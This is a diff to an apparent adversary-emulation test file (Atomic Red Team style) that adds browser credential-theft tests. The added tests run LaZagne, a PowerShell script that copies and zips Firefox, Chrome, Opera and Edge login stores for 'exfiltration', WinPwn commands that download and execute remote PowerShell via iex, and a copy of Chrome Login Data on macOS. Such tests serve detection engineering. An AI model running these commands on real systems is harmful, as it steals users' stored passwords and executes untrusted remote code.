@@ -282,3 +282,107 @@ atomic_tests:
      cat #{Out_Filepath}
     cleanup_command: |
      Remove-Item -Path "#{Out_Filepath}" -erroraction silentlycontinue   
+- name: LaZagne.py - Dump Credentials from Firefox Browser
+  auto_generated_guid: 87e88698-621b-4c45-8a89-4eaebdeaabb1
+  description: Credential Dump Ubuntu 20.04.4 LTS Focal Fossa Firefox Browser, Reference https://github.com/AlessandroZ/LaZagne
+  supported_platforms:
+  - linux
+  input_arguments:
+    lazagne_path:
+      description: Path you put LaZagne Github with LaZagne.py
+      type: String
+      default: /tmp/LaZagne/Linux
+    specific_module:
+      description: You may change the module to "all" for all password that can be found by LaZagne.py
+      type: string
+      default: 'browsers -firefox'
+    output_file:
+      description: This is where output for the Firefox passwords goes
+      type: String
+      default: /tmp/firefox_password.txt
+  dependency_executor_name: sh
+  dependencies:
+  - description: Get Lazagne from Github and install requirements
+    prereq_command: 'test -f #{lazagne_path}/laZagne.py'
+    get_prereq_command: cd /tmp; git clone https://github.com/AlessandroZ/LaZagne; cd /tmp/LaZagne/; pip install -r requirements.txt
+  - description: Needs git, python3 and some pip stuff
+    prereq_command: which git && which python3 && which pip
+    get_prereq_command: apt install git; apt install python3-pip -y; pip install pyasn1 psutil Crypto
+  executor:
+    command: 'python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}'
+    cleanup_command: 'rm -R /tmp/LaZagne; rm -f #{output_file}'
+    name: sh
+    elevation_required: true
+- name: Stage Popular Credential Files for Exfiltration
+  auto_generated_guid: f543635c-1705-42c3-b180-efd6dc6e7ee7
+  description: |
+    This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,
+    simulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). 
+  supported_platforms:
+    - windows
+  executor:
+    name: powershell 
+    command: |
+     $exfil_folder = "$env:temp\T1555.003"
+     if (test-path "$exfil_folder") {} else {new-item -path "$env:temp" -Name "T1555.003" -ItemType "directory" -force}
+     $FirefoxCredsLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\"
+     if (test-path "$FirefoxCredsLocation\key4.db") {copy-item "$FirefoxCredsLocation\key4.db" -destination "$exfil_folder\T1555.003Firefox_key4.db"} else {}
+     if (test-path "$FirefoxCredsLocation\logins.json") {copy-item "$FirefoxCredsLocation\logins.json" -destination "$exfil_folder\T1555.003Firefox_logins.json"} else {}
+     if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data") {copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" -destination "$exfil_folder\T1555.003Chrome_Login Data"} else {}
+     if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account") {copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account" -destination "$exfil_folder\T1555.003Chrome_Login Data For Account"} else {}
+     if (test-path "$env:appdata\Opera Software\Opera Stable\Login Data") {copy-item "$env:appdata\Opera Software\Opera Stable\Login Data" -destination "$exfil_folder\T1555.003Opera_Login Data"} else {}
+     if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {copy-item "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data" -destination "$exfil_folder\T1555.003Edge_Login Data"} else {} 
+     compress-archive -path "$exfil_folder" -destinationpath "$exfil_folder.zip" -force
+    cleanup_command: |
+     Remove-Item -Path "$env:temp\T1555.003.zip" -force -erroraction silentlycontinue   
+     Remove-Item -Path "$env:temp\T1555.003\" -force -recurse -erroraction silentlycontinue
+- name: WinPwn - BrowserPwn
+  auto_generated_guid: 764ea176-fb71-494c-90ea-72e9d85dce76
+  description: Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      browserpwn -consoleoutput -noninteractive
+    cleanup_command: |-
+      rm .\System.Data.SQLite.dll -ErrorAction Ignore
+    name: powershell
+- name: WinPwn - Loot local Credentials - mimi-kittenz
+  auto_generated_guid: ec1d0b37-f659-4186-869f-31a554891611
+  description: Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+      kittenz -consoleoutput -noninteractive
+    name: powershell
+- name: WinPwn - PowerSharpPack - Sharpweb for Browser Credentials 
+  auto_generated_guid: e5e3d639-6ea8-4408-9ecd-d5a286268ca0
+  description: PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn
+  supported_platforms:
+  - windows
+  executor:
+    command: |-
+      iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
+      Invoke-Sharpweb -command "all"
+    name: powershell
+- name: Simulating Access to Chrome Login Data - MacOS
+  auto_generated_guid: 124e13e5-d8a1-4378-a6ee-a53cd0c7e369
+  description: |
+    This test locates the Login Data files used by Chrome to store encrypted credentials, then copies them to the temp directory for later exfil. 
+    Once the files are exfiltrated, malware like CookieMiner could be used to perform credential extraction. 
+    See https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/ . 
+  supported_platforms:
+  - macos
+  executor:
+    command: |
+      cp ~/Library/"Application Support/Google/Chrome/Default/Login Data" "/tmp/T1555.003_Login Data"
+      cp ~/Library/"Application Support/Google/Chrome/Default/Login Data For Account" "/tmp/T1555.003_Login Data For Account"
+    cleanup_command: |
+      rm "/tmp/T1555.003_Login Data" >/dev/null 2>&1
+      rm "/tmp/T1555.003_Login Data For Account" >/dev/null 2>&1
+    name: sh
